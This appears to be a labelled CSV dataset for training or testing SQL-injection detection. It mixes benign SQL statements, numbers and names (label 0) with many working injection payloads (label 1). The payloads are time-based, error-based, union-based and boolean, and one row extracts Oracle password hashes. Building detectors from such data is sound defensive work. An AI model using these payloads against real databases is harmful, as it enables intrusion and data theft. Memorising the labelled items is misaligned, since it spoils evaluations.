Query,Label
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1
SELECT * FROM pale ORDER BY limited DESC,0
1.07544E+15,0
alises,0
SELECT COUNT ( your ) FROM while,0
SELECT DISTINCT citizen FROM everywhere,0
"  SELECT * FROM shaking WHERE them IN  ( 'prevent', 'coach', 'writer' )  ",0
SELECT * FROM are FETCH FIRST 3 ROWS ONLY,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""  =  ""eaqk",1
SELECT town FROM evening UNION ALL SELECT for FROM loss ORDER BY mass,0
d308ada,0
SELECT * FROM island FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM noise ORDER BY president DESC,0
11106027v,0
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",1
" SELECT * FROM eat ORDER BY copper, dot",0
8759,0
"INSERT INTO product  ( instant, spent, pig )  VALUES  ( 'sick', 'plates', 'anybody' )  ",0
"1""  )   as awdg where 9512  =  9512",1
SELECT handle ( s )  FROM family LEFT JOIN,0
"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",1
SELECT * FROM sound 3 SELECT * FROM river,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",1
escogido francesc,0
5986,0
SELECT TOP 3 * FROM activity,0
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--",1
"INSERT INTO steady  ( harder, football, needs )  VALUES  ( 'troops', 'her', 'feed' )  ",0
1   )    )    or pg_sleep  (  __TIME__  )  --,1
"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1
SELECT * FROM  ( SELECT place FROM likely ) ,0
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1
"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",1
SELECT COUNT ( special ) FROM west,0
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #",1
SELECT * FROM  ( SELECT bridge FROM system ) ,0
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb",1
7118,0
"buidaoli, 49, 12-g",0
koprulu,0
contrapalanqun,0
SELECT * FROM giant WHERE string NOT LIKE '[person]%',0
6.49002E+15,0
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,0
1'+  (  select 'hrxp' where 5948  =  5948,1
96174245k,0
SELECT * FROM model WHERE    NOT mail = 'exactly',0
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT Count ( * )  AS exactly,0
us,0
SELECT * FROM anybody WHERE struck NOT BETWEEN 'pull' AND 'rabbit',0
SELECT * FROM current  WHERE satellites NOT LIKE '[worker]%',0
desnudez,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_preferred_partners' LIMIT 1,0
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT ring FROM adult,0
"1"" and sleep  (  5  )  ",1
"  SELECT nearest,feathers FROM paint WHERE score = 'require' UNION SELECT liquid, young FROM together",0
SELECT MIN ( teacher )  AS song FROM castle,0
51795949h,0
SELECT next ( s )  FROM night UNION,0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ,0
SELECT AVG ( Price ) FROM gift,0
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
thuswald,0
SELECT * FROM were WHERE cloth IN  ( SELECT balloon FROM minerals ) ,0
47609,0
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY,0
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
"1"" union all select null,null,null,null,null,null#",1
4.80991E+15,0
SELECT tower ( s )  FROM sometime UNION,0
75u1al3e,0
cadek,0
9.97465E+15,0
SELECT * FROM exact WHERE consist NOT BETWEEN 'political' AND 'introduced',0
SELECT real ( s FROM great RIGHT JOIN,0
"-4637"" where 8354  =  8354 or 1186  =  2714--",1
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',1
"   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL",0
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1"" where 9919  =  9919",1
baily,0
SELECT * FROM safety FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM powerful,0
74132716j,0
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",1
"1""  )   where 6128  =  6128 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
9.92218E+14,0
banyeres del peneds,0
SELECT airplane,0
"   SELECT tall, desert, market FROM soap WHERE depth  IS NULL",0
"  SELECT dull,pick FROM hat WHERE fell = 'time' UNION SELECT think, process FROM sound",0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",1
arrafiz,0
SELECT * FROM border 3,0
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward,0
SELECT TOP 3 * FROM city,0
SELECT * FROM happen WHERE golden = 'worth'  AND  ( tight = 'carefully' OR wide = 'sheet' ) ,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",1
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,1
"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1
waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,1
"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
3.65591E+15,0
SELECT * FROM meant  WHERE post NOT LIKE '[hour]%',0
-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,1
1  )   as qkkm where 8461  =  8461,1
caine@albeiteria.es,0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1
"  SELECT MAKETIME ( 21,   59, 59 ) ;",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",1
"INSERT INTO blood ( meal, each, term, mental, heard, smaller )  VALUES  ( 'her', 'help'. pure', 'develop', 'tell', 'bone', 'constantly' )  ",0
"1""  )   as vdim where 1296  =  1296",1
26111,0
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
" SELECT * FROM outside ORDER BY move, pink",0
SELECT * FROM now  WHERE therefore NOT LIKE '[learn]%',0
"  UPDATE complex SET cover =  'union', City =  'catch' WHERE more =  see",0
8.49643E+15,0
monopolizador,0
androlo,0
SELECT * FROM shallow WHERE wheel BETWEEN '1996-07-01' AND '1996-07-31',0
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1
SELECT * FROM shells WHERE drop NOT LIKE '[grew]%',0
5.1284E+14,0
elian,0
ostapchuk casal,0
"  SELECT sillyID AS ID, darkness AS depend FROM basis",0
SELECT * FROM influence WHERE effort = 'copper'  AND  ( sun = 'until' OR brick = 'standard' ) ,0
6336,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_3_link' LIMIT 1,0
3.62829E+15,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
SELECT * FROM fallen  WHERE leg = ought,0
SELECT * FROM slave FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM useful,0
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
"1  )   and make_set  (  1559  =  4863,4863  )  ",1
1   )    )    and sleep  (  5  )  #,1
SELECT * FROM fed WHERE lion = 'cowboy' LIMIT 3,0
712,0
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
SELECT * FROM solve WHERE habit = 'situation',0
SELECT tears FROM gain,0
SELECT * FROM industry,0
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1
malia,0
pia rusch,0
4.86024E+14,0
"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",1
diy$ambo,0
6.58835E+15,0
7.95304E+15,0
"INSERT INTO pole  ( earn, eat, corner )  VALUES  ( 'harder', 'sun', 'plus' )  ",0
"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""egxe""  =  ""egxe",1
1  )   where 6472  =  6472,1
"  SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )  ",0
byoungin,0
1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
SELECT COUNT ( DISTINCT expect )  FROM substance,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c87dd67714' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT COUNT ( pick ) FROM stop,0
SELECT window FROM zulu UNION SELECT lamp FROM entirely ORDER BY ability,0
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",1
"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1
faustino cavadas 162 6-a,0
SELECT AVG ( noted ) FROM key,0
SELECT * FROM pound,0
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",1
SELECT MIN ( list )  AS enjoy FROM happened,0
jurez,0
SELECT finest ( s )  FROM policeman,0
SELECT * FROM seeing WHERE there BETWEEN '1996-07-01' AND '1996-07-31',0
"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",1
"calle hostieros, 24",0
"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT * FROM breeze WHERE find BETWEEN drop09/01/1996blind AND dish15/31/1996rabbit,0
1'   )    )     )   order by 1--,1
" SELECT * FROM average ORDER BY sure, find",0
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",1
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0
lo7ange,0
SELECT AVG ( western ) FROM main SELECT SUM ( orange ) ,0
"1%""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
" SELECT * FROM afraid ORDER BY wonderful ASC, leaf DESC",0
 UPDATE diagram SET ranch = 'its'WHERE statement = 'try',0
m86uca,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1
"1%""   )    )     )   union all select null#",1
SELECT * FROM slightly FETCH FIRST 3 ROWS ONLY,0
"calle muelles 57, 10?d",0
cycelia,0
SELECT * FROM bright WHERE wooden = 'fresh'  AND City = 'canal',0
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
spencer,0
1  )   where 3381  =  3381,1
"-4304' where 1005  =  1005 union all select 1005,1005#",1
"  SELECT * FROM us WHERE rather IN  ( 'basic', 'similar', 'certainly' )  ",0
" SELECT * FROM took ORDER BY everything ASC, dinner DESC",0
"  SELECT excellent,funny FROM salt WHERE but = 'means' UNION SELECT muscle, percent FROM statement",0
"  SELECT feelID AS ID, sick AS flag FROM possible",0
65223156d,0
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 14594 )  ORDER BY meta_id ASC",0
"1%'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" SELECT column_name ( s )  FROM pleasant,farm",0
estasio,0
SELECT TOP 3 * FROM reach WHERE mood = 'crop',0
-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,1
"1"" union all select null#",1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,1
"-4592""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""xvpz""  =  ""xvpz",1
ling-yu,0
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0
stadler_munks@chevrolet-volt.at,0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,1
1  )   where 7159  =  7159,1
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1
SELECT * FROM courage  WHERE grow NOT LIKE '[thought]%',0
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,0
"1 union all select null,null,null,null,null,null,null--",1
SELECT * FROM simply ORDER BY desk DESC,0
SELECT notice ( s )  FROM again SELECT group FROM however,0
"1""  )   where 7840  =  7840 union all select null,null#",1
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1
"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
2639,0
SELECT * FROM range WHERE indicate = 'discuss'  AND City = 'made',0
UE1,1
1   )    )    as trin where 8843  =  8843,1
"INSERT INTO bush  ( industry, require, human )  VALUES  ( 'interior', 'seed', 'satisfied' )  ",0
"1' where 5251  =  5251 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
